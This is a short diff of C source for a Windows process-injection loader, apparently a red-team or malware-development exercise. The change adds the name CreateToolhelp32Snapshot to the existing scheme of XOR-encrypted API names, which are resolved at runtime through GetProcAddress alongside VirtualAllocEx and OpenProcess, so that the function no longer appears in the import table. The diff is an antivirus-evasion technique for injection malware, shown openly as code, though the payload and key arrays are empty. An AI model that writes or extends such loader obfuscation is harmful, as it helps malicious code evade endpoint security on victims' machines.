@@ -22,6 +22,7 @@ unsigned char s_op[] = { };
 unsigned char s_clh[] = { };
 unsigned char s_p32f[] = { };
 unsigned char s_p32n[] = { };
+unsigned char s_ct32s[] = { };
 
 // encrypted kernel32.dll
 unsigned char s_k32[] = { };
@@ -37,6 +38,7 @@ unsigned int s_op_len = sizeof(s_op);
 unsigned int s_clh_len = sizeof(s_clh);
 unsigned int s_p32f_len = sizeof(s_p32f);
 unsigned int s_p32n_len = sizeof(s_p32n);
+unsigned int s_ct32s_len = sizeof(s_ct32s);
 unsigned int s_k32_len = sizeof(s_k32);
 
 // keys
@@ -50,6 +52,7 @@ char s_op_key[] = "";
 char s_clh_key[] = "";
 char s_p32f_key[] = "";
 char s_p32n_key[] = "";
+char s_ct32s_key[] = "";
 char k32_key[] = "";
 
 LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
@@ -74,6 +77,7 @@ HANDLE (WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWOR
 BOOL (WINAPI * pCloseHandle)(HANDLE hObject);
 BOOL (WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
 BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
     int j;
@@ -99,7 +103,10 @@ int FindTarget(const char *procname) {
         XOR((char *) s_p32n, s_p32n_len, s_p32n_key, sizeof(s_p32n_key));
         pProcess32Next = GetProcAddress(GetModuleHandle(s_k32), s_p32n);
 
-        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        XOR((char *) s_ct32s, s_ct32s_len, s_ct32s_key, sizeof(s_ct32s_key));
+        pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(s_k32), s_ct32s);
+
+        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
 
         pe32.dwSize = sizeof(PROCESSENTRY32);
